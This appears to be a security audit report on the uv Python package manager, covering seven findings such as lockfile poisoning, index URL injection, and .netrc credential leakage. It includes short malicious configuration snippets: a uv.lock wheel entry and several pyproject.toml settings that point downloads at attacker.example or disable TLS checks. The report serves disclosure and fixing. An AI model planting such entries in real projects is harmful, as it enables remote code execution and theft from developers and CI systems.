# Security Audit Report: uv Python Package Manager

**Target:** uv (Astral's Python package and project manager) **Repository:**
https://github.com/astral-sh/uv **Audited Commit:** `da5f6a6967b41423fb2a61bf094adff4e403367c`
**Audit Date:** 2026-05-28 **Auditor:** AutoFyn Security Audit Team

---

## Executive Summary

This report documents seven verified findings in uv. The scope is limited to issues that cross uv's
trust boundary: a victim is compromised by **cloning an untrusted repository and running a normal uv
command**, or by a **remote/MITM attacker** — without the attacker controlling the victim's
environment, files, or cache beforehand, and without the victim first executing attacker-controlled
code. This is consistent with uv's
[security policy](https://github.com/astral-sh/uv/blob/main/SECURITY.md), which treats PEP 517
builds, interpreter invocation, and installation from _requested_ indexes as in-scope-by-design
rather than vulnerabilities.

The most serious findings share a common root cause: **settings that control where uv downloads
binaries and packages from — or that disable integrity and transport checks — are honored from files
that ship with an untrusted repository (`pyproject.toml` and `uv.lock`).** These files are trusted
implicitly the moment a developer runs `git clone` followed by `uv sync`, `uv run`, or
`uv pip install`.

1. **Committed `uv.lock` Poisoning (CRITICAL, UV-2026-020):** A one-line change to a committed
   `uv.lock` — repointing a wheel `url` at an attacker server and removing the `hash` — causes
   `uv sync` to download and install an attacker-controlled artifact over unauthenticated HTTP with
   no integrity check. The entry's `source` field can still read
   `registry = "https://pypi.org/simple"`.

2. **`pyproject.toml` Python Downloads Redirect → RCE (CRITICAL, UV-2026-018):** A checked-in
   `[tool.uv] python-downloads-json-url` redirects the managed-Python interpreter manifest to an
   attacker URL. The manifest accepts `http://` and an optional (null) `sha256`, so
   `uv python install` installs and then executes an attacker-controlled interpreter.

3. **`pyproject.toml` Index URL Injection (CRITICAL, UV-2026-019):** A checked-in
   `[tool.uv] index-url` redirects all dependency resolution to an attacker index; `uv sync` /
   `uv add` / `uv pip install` then download wheels from the attacker.

All findings are reproduced by scripts under `autofyn_audit/exploits/` and can be run together via
`autofyn_audit/scripts/run_all_exploits.sh`, which performs `setup.sh`, runs each exploit, prints a
PASS/FAIL summary, and runs `teardown.sh`. All were verified against a build of the pinned commit.

---

## Findings Summary

| Severity     | ID          | Title                                           | Trigger                                              |
| ------------ | ----------- | ----------------------------------------------- | ---------------------------------------------------- |
| **CRITICAL** | UV-2026-020 | Committed `uv.lock` Poisoning                   | clone repo → `uv sync`                               |
| **CRITICAL** | UV-2026-018 | `pyproject.toml` Python Downloads Redirect→RCE  | clone repo → `uv python install` / `uv run`          |
| **CRITICAL** | UV-2026-019 | `pyproject.toml` Index URL Injection            | clone repo → `uv sync` / `uv add` / `uv pip install` |
| **HIGH**     | UV-2026-007 | `pyproject.toml` allow-insecure-host TLS Bypass | clone repo → any download                            |
| **MEDIUM**   | UV-2026-011 | requirements.txt Index URL Injection            | consume third-party `requirements.txt`               |
| **MEDIUM**   | UV-2026-013 | .netrc Default Credential Disclosure            | pointed at a hostile index that returns 401          |
| **LOW**      | UV-2026-002 | GitHub API URL Injection (Unencoded Rev)        | git dependency rev not percent-encoded               |

---

## Detailed Findings

### UV-2026-020: Committed `uv.lock` Poisoning (CRITICAL)

**Location:** `crates/uv-types/src/hash.rs:40-47, 292-301`;
`crates/uv-distribution-types/src/hash.rs` (`HashPolicy::None`); lockfile wheel schema in
`crates/uv-resolver/src/lock/mod.rs`.

**Description:** A `uv.lock` file is committed to source control and travels with a clone. Each
locked package carries its own wheel `url` and an **optional** `hash` field. uv does not require a
hash for registry/URL wheel entries: under `HashCheckingMode::Verify`,
`HashStrategy::from_resolution()` skips entries with empty digests (`continue`, `hash.rs:299`), and
`HashStrategy::get()` then returns `HashPolicy::None` for any package not in the map (`hash.rs:45`).
`HashPolicy::None` is satisfied by any artifact.

An attacker who lands a one-line change to a committed `uv.lock` — repointing a wheel `url` at a
server they control and removing the `hash` — compromises every developer and CI runner that clones
the repository and runs `uv sync` (or `uv run`, which auto-syncs). The entry's `source` field can
remain `registry = "https://pypi.org/simple"`, so the change is a single line in an auto-generated
file.

**Malicious lockfile entry:**

```toml
[[package]]
name = "harmless-utils"
version = "1.0.0"
source = { registry = "https://pypi.org/simple" }   # unchanged
wheels = [
    { url = "http://attacker.example/harmless_utils-1.0.0-py3-none-any.whl" },
    # url repointed to attacker; `hash = "sha256:..."` removed
]
```

**Impact:** Arbitrary attacker-controlled artifacts are installed via a merged PR or a malicious
upstream repository, with no environment access, no prior code execution, and no write access to the
victim's machine.

**Verified:** PASS — `exploits/19_committed_lockfile_poison/run_exploit.sh`. A project with a
poisoned committed `uv.lock` had its wheel fetched from the attacker URL over plain HTTP with no
hash, and the attacker module was installed into `.venv` by `uv sync --frozen`.

**Recommendation:**

1. Require a hash for every registry/URL wheel entry under `Verify`/locked modes; treat a missing
   hash as an error rather than `HashPolicy::None`.
2. Reject lockfile wheel `url`s whose origin does not match the entry's `source` registry, and
   reject plain-HTTP wheel URLs by default.

---

### UV-2026-018: `pyproject.toml` Python Downloads Redirect → RCE (CRITICAL)

**Location:** `crates/uv-settings/src/settings.rs:1165-1174` (`python_downloads_json_url`, annotated
`uv_toml_only = true`); `crates/uv-settings/src/lib.rs:165-194` (pyproject `[tool.uv]` deserialized
into `Options` with no `uv_toml_only` enforcement); `crates/uv-python/src/downloads.rs`
(download/verify).

**Description:** `python-downloads-json-url` specifies the URL of the JSON manifest of available
managed-Python downloads. The setting is documented as `uv.toml`-only via the `uv_toml_only = true`
annotation, but that annotation produces documentation and schema metadata only — there is no
runtime guard rejecting the setting from a project's `pyproject.toml`. A checked-in
`[tool.uv] python-downloads-json-url` is therefore honored when a victim clones the repository and
runs a command that triggers a managed-Python download (`uv python install`, or `uv run` / `uv sync`
when no suitable interpreter is present).

The manifest fetch accepts plain `http://`, the per-entry `sha256` is optional, and when `sha256` is
absent uv performs no hash verification on the downloaded interpreter archive. uv then executes the
installed interpreter to query its metadata, yielding remote code execution.

**Malicious project file:**

```toml
[tool.uv]
python-downloads-json-url = "http://attacker.example/python.json"
```

**Impact:** Cloning a repository and running a normal managed-Python install yields an
attacker-controlled interpreter binary, executed as the victim, over unauthenticated HTTP with no
integrity check.

**Verified:** PASS — `exploits/17_pyproject_python_downloads/run_exploit.sh`. With no
`UV_PYTHON_DOWNLOADS_JSON_URL` set, `uv python install 3.12.0` inside the cloned project fetched the
manifest from the `pyproject.toml` URL, downloaded the attacker tarball (HTTP, `sha256` null),
installed the attacker `python3.12`, and executing it confirmed RCE.

**Recommendation:**

1. Enforce `uv_toml_only` at runtime: reject (or ignore with a warning) `python-downloads-json-url`,
   `python-install-mirror`, and `pypy-install-mirror` when they originate from `pyproject.toml`.
2. Require HTTPS for the manifest URL and make per-entry `sha256` mandatory.

---

### UV-2026-019: `pyproject.toml` Index URL Injection (CRITICAL)

**Location:** `index-url` / `extra-index-url` / `find-links` in `ResolverInstallerSchema`
(`crates/uv-settings/src/settings.rs`, no `uv_toml_only` annotation); honored from `pyproject.toml`
`[tool.uv]` via `crates/uv-settings/src/lib.rs:165-194`.

**Description:** uv honors `index-url` (and `extra-index-url`, `find-links`) from a project's
`pyproject.toml` `[tool.uv]` table for dependency resolution. A victim who clones a repository and
runs `uv pip install`, `uv lock`, `uv sync`, or `uv add` resolves and downloads all dependencies
from the attacker-controlled index instead of PyPI, with no environment variable, no
`requirements.txt`, and no prior code execution.

**Malicious project file:**

```toml
[tool.uv]
index-url = "http://attacker.example/simple/"
```

**Impact:** Complete control over which packages are resolved and installed for any victim who
clones the repository and runs a standard uv command.

**Verified:** PASS — `exploits/18_pyproject_index_injection/run_exploit.sh`. With no env var and no
`-i` flag, `uv pip install harmless-utils` inside the cloned project resolved against the attacker
index and installed the attacker wheel.

**Recommendation:**

1. Require explicit user confirmation (or a flag) before honoring `index-url`/`extra-index-url` from
   a cloned `pyproject.toml` when it overrides the default index.
2. Warn when the effective index originates from a project file.

---

### UV-2026-007: `pyproject.toml` allow-insecure-host TLS Bypass (HIGH)

**Location:** `crates/uv-settings/src/settings.rs` (`allow_insecure_host` in `GlobalOptions`, no
`uv_toml_only`; contrast `no-proxy`, which carries `uv_toml_only = true`).

**Description:** `allow-insecure-host` disables TLS certificate verification for the listed hosts
and can be declared in a project's `pyproject.toml` `[tool.uv]`. A developer who clones a repository
and runs `uv pip install` / `uv sync` connects to the attacker-listed host with certificate
verification disabled — with no CLI flag and no visible warning — enabling MITM on package and
interpreter downloads even over HTTPS.

**Malicious project file:**

```toml
[tool.uv]
allow-insecure-host = ["attacker.example.com:443"]
```

**Impact:** Silently downgrades transport security for a cloned project, enabling MITM. On its own
it does not redirect downloads, so it is rated HIGH; it composes with a network-position attacker.

**Verified:** PASS — `exploits/06_pyproject_insecure_host/run_exploit.sh`. uv connected to an HTTPS
server with an untrusted self-signed certificate when run inside a project whose `pyproject.toml`
set `allow-insecure-host`, with no CLI flag passed.

**Recommendation:** Enforce `uv_toml_only` for `allow-insecure-host` at runtime, or warn when it is
loaded from `pyproject.toml`.

---

### UV-2026-011: requirements.txt Index URL Injection (MEDIUM)

**Location:** `crates/uv-requirements-txt/src/lib.rs` (`--index-url` parsed from the file); consumed
as the primary index in `crates/uv/src/commands/pip/install.rs`.

**Description:** A `requirements.txt` may contain `--index-url` / `--extra-index-url`, which uv
honors as the resolution index. A third-party or CI-fetched requirements file can redirect all
package resolution to an attacker server.

**Impact:** This is long-standing, pip-compatible behavior, and a `requirements.txt` is understood
to specify what and where to install, so it is a weaker boundary issue than the `pyproject.toml` /
`uv.lock` vectors. It is included because users consume third-party requirements files without
auditing index directives.

**Verified:** PASS — `exploits/10_requirements_index_injection/run_exploit.sh`.

**Recommendation:** Warn when `--index-url` originates from a requirements file rather than the CLI.

---

### UV-2026-013: .netrc Default Credential Disclosure (MEDIUM)

**Location:** `crates/uv-auth/src/credentials.rs:207-210` (falls back to the `default` netrc entry);
credential lookup triggered on a 401 response in `crates/uv-auth/src/middleware.rs`.

**Description:** When resolving credentials from `.netrc`, uv falls back to the `default` entry if
no host-specific match is found. A user with a `.netrc` `default` entry who is pointed at an
attacker-controlled index (e.g. via `--extra-index-url` or the index-injection findings above) has
those credentials sent as Basic auth to the attacker as soon as the attacker server returns 401.

**Impact:** Credential disclosure to a remote attacker with no code execution and no pre-owned
state, but conditioned on the victim having a `.netrc` `default` entry and being pointed at a
hostile index. Reflects standard netrc semantics.

**Verified:** PASS — `exploits/12_netrc_default_leakage/run_exploit.sh`. Credentials from the
`.netrc` `default` entry were captured via the Basic auth header on the attacker server.

**Recommendation:** Warn when credentials are sourced from the `.netrc` `default` entry, or require
explicit opt-in for `default`-entry use.

---

### UV-2026-002: GitHub API URL Injection (Unencoded Rev) (LOW)

**Location:** `crates/uv-git/src/resolver.rs:101-105` —
`format!("{github_api_base_url}/{owner}/{repo}/commits/{rev}")` interpolates the rev without
percent-encoding. `as_url_rev()` (which encodes) exists but is not used here.

**Description:** A git dependency rev containing characters such as `?` is inserted literally into
the GitHub API fast-path URL; e.g. `main?injected=param` becomes `.../commits/main?injected=param`.

**Impact:** Limited. The response must parse as a 40-character hex SHA (`GitOid::from_str`), so
there is no data-exfiltration sink; impact is confined to hitting unexpected endpoints and
rate-limit accounting.

**Verified:** PASS — `exploits/02_github_url_injection/run_exploit.sh`. The mock server captured
`/astral-sh/ruff/commits/main?injected=param` with the unencoded query string.

**Recommendation:** Use `as_url_rev()` (percent-encoding) at `resolver.rs:105`.

---

## Reproduction

### Prerequisites

- A build of uv from the pinned commit (`cargo build --bin uv`), or uv on `PATH`. The exploit
  scripts prefer `target/release/uv` or `target/debug/uv` from the repository root, falling back to
  a system `uv`.
- Python 3 (standard library only) for the local attacker servers.

### Run all findings (setup → run → teardown)

```bash
bash autofyn_audit/scripts/run_all_exploits.sh
```

This runs `setup.sh`, executes each exploit in sequence, prints a PASS/FAIL summary, and runs
`teardown.sh`. Each exploit is independently runnable, e.g.:

```bash
bash autofyn_audit/exploits/19_committed_lockfile_poison/run_exploit.sh
bash autofyn_audit/exploits/17_pyproject_python_downloads/run_exploit.sh
bash autofyn_audit/exploits/18_pyproject_index_injection/run_exploit.sh
```

### Docker

```bash
cd autofyn_audit
docker build -t uv-audit .
docker run --rm uv-audit bash /audit/autofyn_audit/scripts/run_all_exploits.sh
```

---

## Test Environment

- **uv Commit:** `da5f6a6967b41423fb2a61bf094adff4e403367c` (built from source)
- **Base Image:** `python:3.12-slim` (pinned digest in `Dockerfile`)

---

## Appendix: Code References

### UV-2026-020 (Committed uv.lock Poisoning)

- `crates/uv-types/src/hash.rs:292-301` — entries with empty digests skipped (`continue`)
- `crates/uv-types/src/hash.rs:40-47` — `HashStrategy::Verify` returns `HashPolicy::None` for
  missing entries
- `crates/uv-distribution-types/src/hash.rs` — `HashPolicy::None` satisfied unconditionally
- `crates/uv-resolver/src/lock/mod.rs` — wheel entries carry `url` with optional `hash`

### UV-2026-018 (pyproject Python Downloads Redirect)

- `crates/uv-settings/src/settings.rs:1165-1174` — `python_downloads_json_url`, `uv_toml_only`
  (documentation only)
- `crates/uv-settings/src/lib.rs:165-194` — pyproject `[tool.uv]` parsed into `Options`, no
  `uv_toml_only` enforcement
- `crates/uv-python/src/downloads.rs` — `http`/`https` accepted, optional `sha256`, no hash check
  when absent

### UV-2026-019 (pyproject Index URL Injection)

- `crates/uv-settings/src/settings.rs` — `index-url`/`extra-index-url`/`find-links` (no
  `uv_toml_only`)
- `crates/uv-settings/src/lib.rs:165-194` — honored from pyproject `[tool.uv]`

### UV-2026-007 (pyproject allow-insecure-host)

- `crates/uv-settings/src/settings.rs` — `allow_insecure_host` lacks `uv_toml_only` (contrast
  `no-proxy`)

### UV-2026-011 (requirements.txt Index URL Injection)

- `crates/uv-requirements-txt/src/lib.rs` — `--index-url` parsed from requirements.txt
- `crates/uv/src/commands/pip/install.rs` — consumed as primary index

### UV-2026-013 (.netrc Default Credential Disclosure)

- `crates/uv-auth/src/credentials.rs:207-210` — `.or_else(|| netrc.hosts.get("default"))`
- `crates/uv-auth/src/middleware.rs` — credential lookup on 401

### UV-2026-002 (GitHub API URL Injection)

- `crates/uv-git/src/resolver.rs:101-105` — `format!()` with raw rev; `as_url_rev()` exists but
  unused
